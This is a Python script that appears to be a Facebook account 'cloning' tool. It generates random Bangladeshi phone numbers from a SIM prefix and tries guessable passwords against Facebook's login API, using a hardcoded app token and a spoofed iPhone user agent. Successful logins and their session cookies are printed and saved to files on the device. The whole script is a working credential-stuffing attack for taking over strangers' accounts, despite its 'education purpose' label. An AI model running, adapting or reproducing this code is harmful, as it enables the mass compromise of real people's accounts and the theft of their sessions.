#WRITTEN BY MD EMON ALI
#FOLLOW : https://github.com/DH-EMON 
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
# ------------------[ EMON]-------------------#
import os, platform, time, sys

print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY FACEBOOK & SUBSCRIBE YOUTUBE")
time.sleep(2) 

os.system("xdg-open https://www.facebook.com/Anonymousboybd71")
os.system("xdg-open https://youtube.com/@emontechbdofficial146")

os.system('espeak -a 300 " Welcome,   to,  EMON ,    Tools"')

#-------------logo-----------------#
logo=(""" \33[1;91m
\33[1;91m   ___ __  __  ___  _  _   __   ___   ___ 
\33[1;91m  | __|  \/  |/ _ \| \| |__\ \ / /_\ |_ _|
\33[1;91m  | _|| |\/| | (_) | .` |___\ V / _ \ | | 
\33[1;91m  |___|_|  |_|\___/|_|\_|    \_/_/ \_\___|

\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : MD EMON ALI             ║
\33[1;92m║[•] Facebook  : Md Emon Ali (Anonymous) ║
\33[1;92m║[•] Whatsapp  : +***********            ║
\33[1;92m║[•] Github    : Tore Bolbo Kn           ║
\33[1;92m║[•] Status    : TRIAL                   ║
\33[1;92m║[•] Network   : Data / WIFI  Work       ║
\33[1;92m║[•] Version   : 10.1                    ║
\33[1;92m║[•] Tools     : EDUCATION PERPOSE       ║
\33[1;91m╚════════════════════════════════════════╝ """)
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/DH-EMON')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        print(' Use Flight Mode For Speed Up')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','sadia','sumon','emon','rakib']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_DIPTO()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FBIOS;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[EMON-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/EMON-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    os.system('espeak -a 300 " Ok,  Hack,  id"')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[EMON-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/EMON-CP.txt','a').write(ids+'|'+pas+'\n')
                os.system('espeak -a 300 " Cp,"')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
MR_DIPTO()